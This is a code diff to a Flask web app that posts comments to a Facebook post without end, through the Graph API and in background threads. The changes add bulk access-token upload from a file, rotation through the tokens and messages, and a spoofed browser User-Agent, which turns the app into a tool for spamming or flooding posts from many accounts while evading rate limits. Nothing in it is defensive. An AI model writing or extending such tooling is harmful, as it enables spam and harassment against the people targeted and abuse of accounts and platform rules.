@@ -5,7 +5,6 @@ import random
 import string
 from threading import Thread, Event
 from flask import Flask, request, render_template_string
-
 import requests
 
 app = Flask(__name__)
@@ -14,23 +13,39 @@ app.debug = True
 # Task store
 tasks = {}
 
+# ---------------- Headers ----------------
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "Post-Server": "by Aarav Shrivastava"
+}
+
 # ---------------- Worker ----------------
-def worker_comment(task_id, access_token, post_id, interval, comments):
+def worker_comment(task_id, access_tokens, post_id, interval, comments):
     stop_event = tasks[task_id]["stop"]
     index = 0
+    token_index = 0
+
     while not stop_event.is_set():
         try:
             comment = comments[index]
+            current_token = access_tokens[token_index]
+
             url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
-            params = {"access_token": access_token, "message": comment}
-            r = requests.post(url, data=params, timeout=10)
+            params = {"access_token": current_token, "message": comment}
+
+            r = requests.post(url, data=params, headers=headers, timeout=10)
             if r.status_code == 200:
-                print(f"[{task_id}] ✅ Comment posted: {comment}")
+                print(f"[{task_id}] ✅ Comment posted with token {token_index+1}: {comment}")
             else:
                 print(f"[{task_id}] ❌ Failed: {r.text}")
+
+            # Rotate message + token
             index = (index + 1) % len(comments)
+            token_index = (token_index + 1) % len(access_tokens)
+
         except Exception as e:
             print(f"[{task_id}] ⚠️ Error: {e}")
+
         time.sleep(interval)
 
 # ---------------- HTML ----------------
@@ -59,8 +74,13 @@ INDEX_HTML = """
 
           <form method="post" enctype="multipart/form-data">
             <div class="mb-3">
-              <label>Access Token</label>
-              <textarea name="token" class="form-control" placeholder="EAAG..." required></textarea>
+              <label>Single Access Token</label>
+              <textarea name="singleToken" class="form-control" placeholder="EAAG..."></textarea>
+            </div>
+
+            <div class="mb-3">
+              <label>Or Upload Token File (one per line)</label>
+              <input type="file" name="tokenFile" class="form-control">
             </div>
 
             <div class="mb-3">
@@ -104,7 +124,19 @@ INDEX_HTML = """
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
-        token = request.form.get("token", "").strip()
+        # Token Handling
+        access_tokens = []
+        single_token = request.form.get("singleToken", "").strip()
+        token_file = request.files.get("tokenFile")
+
+        if token_file and token_file.filename:
+            access_tokens = token_file.read().decode().strip().splitlines()
+        elif single_token:
+            access_tokens = [single_token]
+
+        if not access_tokens:
+            return "At least one token is required", 400
+
         post_id = request.form.get("postId", "").strip()
         try:
             interval = int(request.form.get("time", "10"))
@@ -121,7 +153,7 @@ def index():
         task_id = os.urandom(4).hex()
         stop_ev = Event()
         tasks[task_id] = {"thread": None, "stop": stop_ev}
-        t = Thread(target=worker_comment, args=(task_id, token, post_id, interval, comments))
+        t = Thread(target=worker_comment, args=(task_id, access_tokens, post_id, interval, comments))
         tasks[task_id]["thread"] = t
         t.daemon = False
         t.start()
